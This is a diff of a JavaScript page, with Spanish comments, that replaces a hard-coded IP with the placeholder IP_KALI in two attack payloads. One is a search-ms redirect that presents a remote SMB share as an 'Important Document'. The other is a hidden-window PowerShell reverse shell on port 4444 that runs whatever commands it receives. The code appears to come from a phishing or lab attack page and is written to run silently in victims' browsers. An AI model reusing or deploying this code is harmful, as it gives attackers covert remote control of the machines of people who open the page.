@@ -64,7 +64,7 @@
             setTimeout(() => {
                 try {
                     // search-ms protocol - característica legítima de Windows
-                    const payload = `search-ms:query=document&crumb=location:\\\\192.168.1.25\\share&displayname=Important Document`;
+                    const payload = `search-ms:query=document&crumb=location:\\\\IP_KALI\\share&displayname=Important Document`;
                     window.location.href = payload;
                 } catch (e) {
                     // Fallback silencioso
@@ -97,7 +97,7 @@
         
         function executeFallback() {
             // Técnica 3: Intentar descargar y ejecutar via PowerShell sin mostrar ventana
-            const powershellCode = `Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command "$c=New-Object Net.Sockets.TCPClient(\\'192.168.1.25\\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\\'PS \\'+(pwd).Path+\\'> \\';$by=([text.encoding]::ASCII).GetBytes($r2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()"' -Wait`;
+            const powershellCode = `Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command "$c=New-Object Net.Sockets.TCPClient(\\'IP_KALI\\',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\\'PS \\'+(pwd).Path+\\'> \\';$by=([text.encoding]::ASCII).GetBytes($r2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()"' -Wait`;
             
             // Intentar ejecutar via múltiples métodos
             try {
